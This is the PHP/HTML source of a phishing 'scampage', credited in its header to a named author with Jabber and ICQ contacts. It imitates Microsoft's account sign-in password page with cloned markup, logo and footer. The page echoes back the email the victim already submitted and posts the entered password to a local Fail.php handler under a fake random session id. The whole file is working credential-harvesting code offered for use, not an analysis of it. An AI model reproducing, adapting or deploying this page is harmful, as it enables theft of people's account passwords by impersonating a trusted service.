<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

$_SESSION['username'] = $_POST['email'];

?>
<!DOCTYPE html>
<!-- ServerInfo: BAYIDSLGN3E024 2018.08.08.15.32.25 Live1 Unknown LocVer:0 -->
<!-- PreprocessInfo: azbldrun:CY1AZRBLD42VM1, 2018-08-08T22:10:40.0930770Z - Version: 16,0,27887,2 -->
<!-- RequestLCID: 1033, Market:EN-US, PrefCountry: US, LangLCID: 1033, LangISO: EN -->
<html dir="ltr" lang="EN-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">

    <title>Sign in to your Microsoft account</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="assets/files/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="assets/files/Converged_v21033.css">
    <style type="text/css"></style>
    <style type="text/css">body{display:none;}</style>
    <style type="text/css">body{display:block !important;}</style>
    <noscript>
        <style type="text/css">body{display:block !important;}</style>
    </noscript>

</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
    <!--  -->
    <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
        <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
            <!-- ko if: smallImageUrl -->
            <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url('assets/files/bg-small.jpg');"></div>
            <!-- /ko --><!-- ko if: backgroundImageUrl -->
            <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url('assets/files/bg-large.jpg');"></div>
            <!-- ko if: useImageMask --><!-- /ko --><!-- /ko -->
        </div>
    </div>
    <form method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="Fail.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>">
        <!-- ko withProperties: { '$loginPage': $data } -->
        <div class="outer" data-bind="component: { name: 'page',
               params: {
               serverData: svr,
               showButtons: svr.Ay,
               showFooterLinks: true,
               useWizardBehavior: svr.A4,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.AZ --><!-- /ko -->
            <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko -->
                <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }">
                    <!-- ko ifnot: paginationControlMethods()
                       && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                           || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) -->
                    <div data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                        <img class="logo" role="presentation" pngsrc="assets/files/logo.png" svgsrc="assets/files/microsoft_logo.svg" data-bind="imgSrc" src="assets/files/microsoft_logo.svg">

                        <!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko -->
                    </div>
                    <!-- /ko --><!-- ko if: svr.bp && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko -->
                    <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow } }">
                        <div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
                            <!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } -->
                            <div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.q === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  --> <input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> <input name="login" data-bind="value: unsafe_username" value="<?php echo $_SESSION['username']; ?>" type="hidden"> <input name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> <input name="type" data-bind="value: svr.A4 ? 20 : 11" value="11" type="hidden"> <input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> <input name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="" type="hidden"> <input name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="" type="hidden"> <input name="hisRegion" data-bind="value: callMetadata.HisRegion" value="" type="hidden"> <input name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="" type="hidden"><!-- TODO: Rename 'displayName' property to unsafe_displayName here and in other corresponding views --> <div data-bind="component: { name: 'identity-banner-control',
    params: {
        pawnIconId: svr.B4,
        displayName: unsafe_displayName(),
        isBackButtonVisible: svr.Ay &amp;&amp; isBackButtonVisible() &amp;&amp; svr.Bw },
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['username']; ?>"><?php echo $_SESSION['username']; ?></div><!-- ko ifnot: svr.Bw --><!-- /ko --> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="passwd" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str['CT_PWD_STR_PwdTB_AriaLabel'],
                    css: { 'has-error': passwordTextbox.error }" placeholder="Password" aria-label="Enter password" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;" type="password"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.U && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.BM, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.BQ --><!-- /ko --><!-- ko if: svr.AV !== false && !svr.BQ && !tenantBranding.KeepMeSignedInDisabled --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                        params: {
                            serverData: svr,
                            availableCreds: availableCreds,
                            currentCred: 1 },
                        event: {
                            switchView: onSwitchView } } --><div data-bind="css: { 'form-group': !isMenuLink }" class="form-group"><!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --> </div><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div><div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.Ay,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.Ay &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.Bw },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.BM, 'button-container': svr.BM }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            'inline-block': svr.BM,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.BM,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.BM) }" class="inline-block"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in" type="submit"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div>
                            <!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko -->
                        </div>
                    </div>
                </div>
                <!-- ko if: newSessionMessage --><!-- /ko --> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="" type="hidden"> <input name="ctx" data-bind="value: ctx" value="" type="hidden"> <input name="hpgrequestid" data-bind="value: svr.sessionId" value="" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.bk }, value: flowToken" name="PPFT" value="DWo1SCYxJulK66Axcm2BM5PGk4W5vMi82MIG1DDvn65QzgRB17zzV8x*Uh9abZ8y7*uB!1zYxtJ9D*iMe3tn!UChg*lbQZ2jSDDduVSTnelLJcPsrYSnFx5YP*f0qG0MjGfLCHhfNc0cXi6!YiVX90jLiki0HlBBECSG!N6oOF4v8Rf8cV5D1TQq3lk8A!M98ExjnTWIsAKTquVVu4Hmqr7DFINRjJe4GUwGYF7S366X!mNw49mraTecn0zX1!nS5bCx5v9RZgoytsPjaGdwcMo$" type="hidden"> <input name="PPSX" data-bind="value: svr.bn" value="Pass" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.S" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.AZ ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1" type="hidden">
                <div data-bind="component: { name: 'instrumentation',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="0" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="__ConvergedLoginPaginatedStrings|1,__OldConvergedLogin_PCore|1," type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div>
                <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                    <div data-bind="component: { name: 'footer-control',
                        params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }">
                        <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense -->
                        <div id="footerLinks" class="footerNode text-secondary">
                            <!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.bo">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko -->
                            <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel']" aria-label="Click here for more options">
                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /ko --> <!-- /ko --><!-- /ko -->
                            </a>
                        </div>
                        <!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko -->
                    </div>
                </div>
            </div>
            <!-- /ko -->
        </div>
        <!-- /ko --><!-- ko if: svr.BZ --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko -->
    </form>
    <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
        <!-- ko foreach: postRedirectParams --><!-- /ko -->
    </form>
    <!-- ko if: svr.AM --><!-- /ko --><!-- ko if: svr.Aj -->
    <div id="idPartnerPL" data-bind="injectIframe: { url: svr.Aj }"><iframe style="display: none;" src="assets/files/prefetch.htm" width="0" height="0"></iframe></div>
    <!-- /ko -->
</div>
</body>
</html>
